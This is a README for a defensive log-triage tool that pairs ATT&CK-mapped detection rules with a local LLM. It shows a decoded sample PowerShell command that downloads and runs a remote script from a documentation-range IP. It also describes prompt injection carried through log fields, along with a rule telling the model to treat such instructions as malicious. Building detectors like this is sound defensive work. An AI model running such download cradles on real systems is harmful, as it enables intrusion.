# Local SOC Analyst

**Triage Linux and Windows security logs with ATT&CK-mapped detection rules and a local LLM. Your logs never leave your machine.**

[![CI](https://github.com/Cyhelm-Vciso/local-soc-analyst/actions/workflows/ci.yml/badge.svg)](https://github.com/Cyhelm-Vciso/local-soc-analyst/actions/workflows/ci.yml)
![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)
![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)
![Dependencies: 0](https://img.shields.io/badge/dependencies-0-brightgreen)

Point it at `auth.log` or a Windows/Sysmon export. Deterministic rules find the suspicious activity. A local model (Ollama, LM Studio or llama.cpp) then explains each finding, gives a verdict, and suggests next steps, and the results are written up as a Markdown report your team can read.

```bash
pip install git+https://github.com/Cyhelm-Vciso/local-soc-analyst
```

```bash
soc-analyst demo
```

Real output from `soc-analyst demo --no-llm` on the bundled **synthetic** logs:

| # | Severity | Finding | Host | ATT&CK |
|---|---|---|---|---|
| 1 | 🟥 critical | 'root' logged on from 203.0.113.45 after 14 failures | web01 | T1110, T1078 |
| 2 | 🟥 critical | 'sysupdate' added to 'sudo' | web01 | T1098, T1136.001 |
| 3 | 🟥 critical | Encoded PowerShell on FIN-WS07 | FIN-WS07 | T1059.001, T1027, T1105 |
| 4 | 🟥 critical | Credential dumping tooling on FIN-WS07 | FIN-WS07 | T1003.001 |
| 5 | 🟥 critical | 'svc_backup2' added to 'Administrators' | FIN-WS07 | T1098, T1136.001 |
| 6 | 🟥 critical | Recovery inhibited on FIN-WS07 | FIN-WS07 | T1490 |
| 7 | 🟧 high | 198.51.100.23 tried 8 different accounts | web01 | T1110.003 |
| 8 | 🟧 high | winword.exe → powershell.exe on FIN-WS07 | FIN-WS07 | T1204.002, T1566.001 |
| … | | *17 findings in total* | | |

The encoded PowerShell is decoded for you:

> Decoded command: `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.77/update.ps1')`

With a model connected, each finding also gets a **verdict** (likely malicious / suspicious / likely benign), a **confidence**, a plain-English **summary**, **next steps**, **benign explanations** to rule out, and **questions for the system owner**. A shift-handover summary at the top ties related findings into one story.

## Why rules first, LLM second?

Asking an LLM to "find the attacks" in raw logs doesn't work. It misses things, invents things, and can't read gigabytes of data. This tool splits the job:

| Step | Done by | Why |
|---|---|---|
| Parse and detect | 14 deterministic rules | Reproducible and testable, with no hallucinated alerts |
| Explain and prioritise | Local LLM | Saves analyst time on context, verdicts and next steps |
| Decide | You | Every verdict is decision support, backed by the evidence |

## Detection rules

```text
$ soc-analyst rules
brute_force              T1110.001                  Password guessing against an account
password_spray           T1110.003                  Password spraying across many accounts
success_after_failures   T1110, T1078               Successful logon after repeated failures
sudo_abuse               T1548.003                  Repeated sudo failures or unauthorised sudo
privileged_group_add     T1098                      Account added to a privileged group
account_created          T1136.001                  New local or domain account created
log_cleared              T1070.001                  Event log cleared
inhibit_recovery         T1490                      Backups or shadow copies deleted
encoded_powershell       T1059.001, T1027           Encoded PowerShell command
office_spawns_shell      T1204.002, T1566.001       Office application spawned a shell or script host
lolbin_abuse             T1218, T1105, T1140        Living-off-the-land binary used to download or proxy execution
credential_dumping       T1003.001                  Possible LSASS credential dumping
suspicious_service       T1543.003                  New service installed
suspicious_task          T1053.005                  Scheduled task created
```

## Supported inputs

| Source | Format | How to collect |
|---|---|---|
| Linux `auth.log` / `secure` | syslog or ISO-8601 timestamps | `/var/log/auth.log`, or `journalctl -o short-iso` |
| Windows Security & System | JSON/JSONL (flat) | PowerShell one-liner in [docs/collect-windows-logs.md](docs/collect-windows-logs.md) |
| Sysmon (Event ID 1) | JSON/JSONL | Same script |
| Offline `.evtx` files | `evtx_dump -o jsonl` output | Nested format detected automatically |

## Usage

```bash
ollama pull llama3.1:8b
```

```bash
soc-analyst analyze /var/log/auth.log events.jsonl -o report.md --json report.json
```

| Option | Purpose |
|---|---|
| `--no-llm` | Rules-only report, no model needed |
| `--redact` | Replace users, hosts and IPs with `USER_1` / `HOST_1` / `IP_1` before prompting, and restore them in the report |
| `--min-severity high` | Hide lower-severity findings |
| `--rule encoded_powershell` | Run specific rules only (repeatable) |
| `--fail-on critical` | Exit code 3 if a finding at or above this severity fires (for cron or CI) |
| `--provider openai --base-url http://localhost:1234/v1` | Use LM Studio, llama.cpp `llama-server`, vLLM or LocalAI |
| `--max-triage 25` | Cap how many findings are sent to the model |

## Security design

- **Local by default.** It refuses non-local model endpoints unless you pass `--allow-remote`, and bypasses HTTP proxies. No telemetry. Zero third-party dependencies.
- **Prompt-injection aware.** Attackers control log content: usernames, command lines, task names. All log-derived text is fenced inside `<evidence>` tags and labelled untrusted, and the model is told to treat any instructions in it as an indicator of malice. The sample data includes a username that tries this.
- **Validated output.** The model's JSON is schema-checked. Unknown verdicts or severities fall back to safe defaults, and the rule's own severity is always shown alongside the model's.
- **Redaction** (`--redact`) is best-effort. Review prompts before using `--allow-remote` with sensitive data.

## Limitations

- These rules are a starting point, not a SIEM. They're tuned for clear signals, and a quiet report doesn't mean the logs are clean.
- Thresholds (for example 8 failures in 10 minutes) are defaults in `detections.py`. Tune them for your environment.
- LLM verdicts can be wrong. Treat them as a second opinion.

## Development

```bash
pip install -e ".[dev]"
```

```bash
pytest
```

Tests use a fake model server. Regenerate the sample data with `python scripts/make_samples.py`. All IPs come from the RFC 5737 documentation ranges.

## Roadmap

- [ ] Sigma rule support
- [ ] Zeek / firewall / CloudTrail parsers
- [ ] HTML report with a timeline view
- [ ] Per-host incident grouping

## Related projects

- [airgap-compliance-rag](https://github.com/Cyhelm-Vciso/airgap-compliance-rag): offline Q&A over NIST, EU law and your policies
- [sec-llm-bench](https://github.com/Cyhelm-Vciso/sec-llm-bench): find out which local model is best at security tasks
- [rag-eval-starter](https://github.com/Cyhelm-Vciso/rag-eval-starter): learn RAG with evaluation built in
- [ciso-toolkit](https://github.com/Cyhelm-Vciso/ciso-toolkit): Claude skills for security leadership

## License

MIT. MITRE ATT&CK® is a registered trademark of The MITRE Corporation. Not affiliated with MITRE, Microsoft or Ollama.
